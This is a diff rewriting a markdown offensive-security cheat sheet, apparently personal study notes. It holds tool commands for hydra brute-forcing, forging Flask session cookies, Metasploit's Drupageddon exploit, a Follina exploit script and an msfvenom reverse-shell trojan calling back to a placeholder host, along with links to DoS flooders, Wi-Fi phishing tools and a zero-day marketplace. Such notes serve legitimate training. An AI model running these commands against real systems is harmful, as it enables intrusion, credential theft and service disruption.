@@ -1,168 +1,137 @@
-# Frameworks for Recording Threat Actions
-https://attack.mitre.org/
+# Cybersecurity Threats & Offensive Security Techniques
 
-## Exploitation is someone brute-forcing it with hydra
+## Frameworks for Tracking Threat Actions
+- **MITRE ATT&CK**: [https://attack.mitre.org/](https://attack.mitre.org/)
+
+## Exploitation Techniques
+### Brute-Forcing with Hydra
 ```sh
 hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V
 ```
-## **Intrusion Prevention System (IPS)** is security system for catching and preventing security threats.
-*It works on predefined security rules, just like IP:* https://www.snort.org/
 
-## How to Check What Ports are Opened on Your PC?
-▪ **Windows:** 
+### Intrusion Prevention Systems (IPS)
+- IPS solutions analyze network traffic to detect and prevent threats.
+- Example: **Snort** ([https://www.snort.org/](https://www.snort.org/))
+
+## Port Scanning & Enumeration
+### Checking Open Ports:
+- **Windows:**
 ```sh
-netstat –an, netstat –antb
+netstat -an
+netstat -antb
 ```
-▪ **Unix:** 
+- **Unix/Linux:**
 ```sh
-ss -nltp, netstat –tulpn
+ss -nltp
+netstat -tulpn
 ```
 
-# JWT Token Vulnerability
+## JWT Token Security Assessment
 ```sh
 flask-unsign -u -c .XXXXXXXXX -nE -w /usr/share/wordlists/rockyou.txt
-flask-unsign -s --secret "secret123" --cookie "{'loggin': True, 'username': 'blue'}" -l
+flask-unsign -s --secret "secret123" --cookie "{'login': True, 'username': 'blue'}" -l
 sudo -l
 ```
 
-## How to Search for Vulnerabilities?
-**More details for ExploitDB:** https://www.exploit-db.com/
+## DataBase Vulnerability Research
+- **Exploit Database**: [https://www.exploit-db.com/](https://www.exploit-db.com/)
+- **Common Vulnerabilities (CVE Database)**: [https://www.cve.org/](https://www.cve.org/)
+- **National Vulnerability Database**: [https://nvd.nist.gov/](https://nvd.nist.gov/)
 
-
-## Drupal7  (Versions 7.0 to 7.31 are vulnerable to SQL Injection)
-
+## CMS Vulnerabilities
+### Drupal 7 (Versions 7.0 - 7.31) - SQL Injection Exploit
 ```sh
-smsf6 exploit(multi/http/drupal_drupageddon) > show options
+msf6 exploit(multi/http/drupal_drupageddon) > show options
 msf6 exploit(multi/http/drupal_drupageddon) > exploit
 ```
-## How to Prevent Obsolete Software Vulnerabilities?
 
-▪ Updates are not just for new functionalities, most of them are designed for fixing security problems –ALWAYS BE UPDATED!   <br />
-▪ Look for updates in different aspects of your context, for example if the Wordpressengine is the latest version, but the plugins inside are outdated, the same problems can occur.   <br />
-▪ Look at your system as a whole, donot divide it. If you update any aspect of it, make sure to update all other subsystems   <br />
+## Preventing Obsolete Software Vulnerabilities
+- Regularly update all system components, including plugins and dependencies.
+- Ensure security patches are applied to the entire system.
+- Review configurations to prevent misconfigurations leading to vulnerabilities.
 
-## How to brute-force a Password?
+## Password Cracking & Hash Recovery
+- **Hydra**: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
+- **Hashcat**: [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
+- **CrackStation**: [https://crackstation.net](https://crackstation.net)
 
-**Using hydra:** https://github.com/vanhauser-thc/thc-hydra
+## Credential Capture with Responder
+- Tool: [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
 
-**More details at:** <br />
-▪ https://hashcat.net/wiki/doku.php?id=example_hashes <br />
-▪ https://crackstation.net <br />
+## Zero-Day Exploit Marketplace
+- [https://0day.today](https://0day.today)
 
-## Get hash with Responder  <br /> 
-**More details at:** https://github.com/SpiderLabs/Responder <br />
-
-## Zero Days Marketplace (There is a database and a marketplace for that) <br />
-**More details at:** https://0day.today
-
-## Using Folina 
+## Exploiting Microsoft Office Vulnerabilities
+### CVE-2022-30190 (Follina)
 ```sh
 python3 follina.py -r 9999
 ```
+- More details: [https://www.hackthebox.com/blog/cve-2022-30190-follina-explained](https://www.hackthebox.com/blog/cve-2022-30190-follina-explained)
 
-**More Details at:** https://www.hackthebox.com/blog/cve-2022-30190-follina-explained
+## Wireless Security Assessment Tools
+- **Airgeddon**: [https://github.com/v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
+- **WiFiPhisher**: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
+- **WiFi Exploitation Framework**: [https://github.com/D3Ext/WEF](https://github.com/D3Ext/WEF)
 
-## More Databases for Vulnerabilities:
-▪ https://www.cve.org/ <br />
-▪ https://www.exploit-db.com/ <br />
-▪ https://nvd.nist.gov/ <br />
-▪ https://www.cvedetails.com <br />
-
-# Frameworks to Perform Wi-Fi Attacks
-
-▪ **Airgeddon:** https://github.com/v1s1t0r1sh3r3/airgeddon   <br />
-▪ **WiFiPhisher:** https://github.com/wifiphisher/wifiphisher   <br />
-▪ **WiFiExploitation Framework:** https://github.com/D3Ext/WEF   <br />
-
-```sh 
-python listener.py
-```
-
-**More details at:**: https://www.youtube.com/watch?v=A8DkVDQW1-w
-
-*Technical Side of Phishing Attacks is Scary Easy to Replicate* <br />
-
-**More details at:** https://github.com/trustedsec/social-engineer-toolkit
-
+## Social Engineering & Phishing
+- **SET (Social Engineer Toolkit)**: [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)
 ```sh
 sudo setoolkit
 ```
 
-## Denial of Service (DOS)is the easiest to perform attack
+## Denial of Service (DoS) Attack Tools
+- **LOIC** ([https://sourceforge.net/projects/loic/](https://sourceforge.net/projects/loic/))
+- **HOIC** ([https://sourceforge.net/projects/highorbitioncannon/](https://sourceforge.net/projects/highorbitioncannon/))
+- **hping3** ([https://www.kali.org/tools/hping3/](https://www.kali.org/tools/hping3/))
+- **TorsHammer** ([https://github.com/Karlheinzniebuhr/torshammer](https://github.com/Karlheinzniebuhr/torshammer))
 
-▪ **LOIC** (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP    <br />
-GET FLOODS   <br /> 
-▪ **HOIC** (https://sourceforge.net/projects/highorbitioncannon/)   <br />
-HTTP GET / POST requests   <br />
-▪ **hping3:** https://www.kali.org/tools/hping3/   <br />
-▪ **TorsHammer:** https://github.com/Karlheinzniebuhr/torshammer   <br />
-
-## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
-
-MSFvenom (MSFvenom-MetasploitUnleashed (offensive security.com))   <br />
+## Reverse Shell & Payload Generation
+### Generating a Windows Reverse Shell with MSFVenom
 ```sh
-msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP
-LPORT=PORT –f exe –o file.exe
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o file.exe
 ```
 
-# Ransomware
+## Ransomware Overview
+- **Notable Variants**:
+  1) WannaCry
+  2) CryptoLocker
+  3) BadRabbit
 
-1) WannaCry;
-2) CryptoLocker;
-3) BadRabbit;
+## Spyware & Information Theft
+- Spyware remains hidden while collecting sensitive user data.
 
-# Spyware
-Spywareis a type of malware that stays hidden and gathers as much sensitive data as possible
-
-# SQL Injection
-There are many types of SQL Injection attacks, such as: error based, stacked queries, union based and more;
+## SQL Injection Techniques
+- Error-based, Union-based, Blind SQL Injection
 ```sh
-smsf6 exploit(multi/http/drupal_drupageddon) > show options
+msf6 exploit(multi/http/drupal_drupageddon) > show options
 msf6 exploit(multi/http/drupal_drupageddon) > exploit
 ```
 
-# Brute Forcing Attacks   <br />
-**Example software for performing the attack:**   <br />
-▪ **THC-Hydra:** https://github.com/vanhauser-thc/thchydra   <br />
-▪ **Burp Intruder:** https://portswigger.net/burp/pro   <br />
-▪ **Medusa:** https://github.com/jmk-foofus/medusa   <br />
-
-# Security Information and Event Management - SIEM for Securty analysis
-
-**Enumerating Reverse Shells**
+## Security Information and Event Management (SIEM)
+### Enumerating Active Reverse Shells
 ```sh
 ps -aef --forest
 ```
+- **Common SIEM Tools**: Splunk, ELK Stack, QRadar
+- **Common Red Team Tools**: Sliver C2, Wireshark
 
-The most commonly used software is **Sliver C2 HTTP Beacon** with **Wireshark**
+## Penetration Testing Operating Systems
+- **Kali Linux**: [https://www.kali.org](https://www.kali.org)
+- **Parrot OS**: [https://www.parrotsec.org](https://www.parrotsec.org)
+- **Black Arch**: [https://blackarch.org](https://blackarch.org)
 
-# Penetration Testing Operational Systems (OS)
-▪ **Kali Linux:** https://www.kali.org   <br />
-▪ **Parrot OS:** https://www.parrotsec.org  <br />
-▪ **Black Arch:** https://blackarch.org   <br />
-▪ **CommandoVM:** https://github.com/mandiant/commando-vm   <br />
-▪ **Nessus:** https://www.tenable.com/products/nessus   <br />
-▪ **Nmap:** https://nmap.org   <br />
-▪ **BurpSuite:** https://portswigger.net/burp   <br />
-▪ **Searchsploit:** https://www.exploit-db.com/searchsploit   <br />
+## Privilege Escalation
+### Local Enumeration for Escalation Paths
+- **LinPEAS**: [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
-## Scanning local system for ***privilege escalation*** attack vectors with linpeas
+## Hands-on Cybersecurity Training
+- **TryHackMe**: [https://tryhackme.com/](https://tryhackme.com/)
+- **HackTheBox**: [https://www.hackthebox.com/](https://www.hackthebox.com/)
 
-**More details at:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS   <br />
-
-**On github:** https://github.com/juliocesarfort/public-pentesting-reports   <br />
-
-▪ **TryHackMe:** https://tryhackme.com/   <br />
-▪ **Vulnhub:** https://www.vulnhub.com/   <br />
-▪ **HackTheBox:** https://www.hackthebox.com/   <br />
-
-**Use ATT&CK Navigator:** <br />
-https://mitre-attack.github.io/attack-navigator/ to map a sample TTP   <br />
-
-***USING KALI LINUX with Seclists and Run:***   <br />
+## Wordlist Setup for Attacks
 ```sh
 cd /opt/
 sudo git clone https://github.com/danielmiessler/SecLists
 cd /usr/share/wordlists
-sudo gzip–d rockyou.txt.gz
+sudo gzip -d rockyou.txt.gz
 ```
